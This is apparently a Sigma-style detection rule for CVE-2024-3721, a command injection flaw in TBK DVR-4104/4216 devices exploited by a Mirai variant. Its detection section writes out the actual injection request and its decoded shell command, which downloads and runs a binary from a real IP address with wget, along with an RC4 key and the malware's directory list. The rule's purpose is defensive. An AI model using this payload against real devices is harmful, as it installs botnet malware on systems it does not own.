title: CVE-2024-3721 Critical command injection vulnerability discovered in TBK DVR-4104 and DVR-4216 devices. 
id: 7f43064c-8c75-4952-9f4e-8270dcf57929
status: test
description: This vulnerability allows a remote attacker to inject OS commands by manipulating the mdb/mdc argument in the /device.rsp endpoint. The exploit is publicly available, increasing the risk of exploitation.
references:
    - https://socradar.io/labs/app/cve-radar/CVE-2024-3721
    - https://www.cvedetails.com/cve/CVE-2024-3721/
    - https://securelist.com/mirai-botnet-variant-targets-dvr-devices-with-cve-2024-3721/116742/
author: Subhankar H.
date: 2025-08-08
modified: na
tags:
    - CWE Common Weakness Enumeration (CWE-213)
logsource:
    product: DVR-based monitoring systems
    category: Default
detection:
    selection 1 :
       Entry Point | CommandLine Endswith : "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F42.112.26.36%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1 200 1671 Mozila/5.0"
       
       Shellscript | Endswith : "cd /tmp; rm arm7; wget http://42[.]112[.]26[.]36/arm7; chmod 777 *; ./arm7 tbk"
             
    selection 2:
        RC4 Key | Endswith : "6e7976666525a97639777d2d7f303177"
          
    selection 3:
        Allowed Directories | Endswith: 
            - "/usr/bin"
            - "/usr/sbin"
            - "/system"
            - "/mnt/mtd/app"
            - "/org"
            - "/z/zbin"
            - "/home/app"
            - "/dvr/bin"
            - "/duksan"
            - "/usr/duksan"
            - "/mnt/app"
            - "/usr/etc"
            - "/dvr/main"
            - "/usr/local"
            - "/tmp/sqfs"
            - "/zbin"
            - "/dvr"
            - "/mnt/mtd"
            - "/zconf"
            - "/gm/bin"
            - "/home/process"
            - "/lib"
            - "/snap"

    condition: selection 1 and selection 2 and selection 3
falsepositives:
    - Unknown
level: medium